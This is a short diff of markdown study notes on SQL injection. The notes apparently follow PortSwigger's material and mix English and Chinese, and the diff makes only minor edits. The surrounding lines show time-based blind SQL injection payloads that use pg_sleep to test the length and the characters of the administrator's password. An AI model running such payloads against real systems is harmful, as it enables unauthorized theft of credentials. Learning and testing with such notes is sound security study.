@@ -148,7 +148,6 @@ example ：  `'||SELECT sleep(10)--`
 '%3Bselect case when (length(password)>20) then pg_sleep(5) else pg_sleep(0) end from users where username='administrator'--
 
 '%3Bselect case when (substr(password,1,1)='a') then pg_sleep(2) else pg_sleep(0) end from users where username='administrator'--
-
 ```
 
 #### Exploiting blind SQL injection using out-of-band ([OAST](https://portswigger.net/burp/application-security-testing/oast)) techniques
@@ -167,6 +166,6 @@ retrive data
 
 ### SQL injection cheat sheet
 
-链接包含常见不同数据库的各种探测绕过技巧
+链接包含常见不同数据库的绕过方法
 
 [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
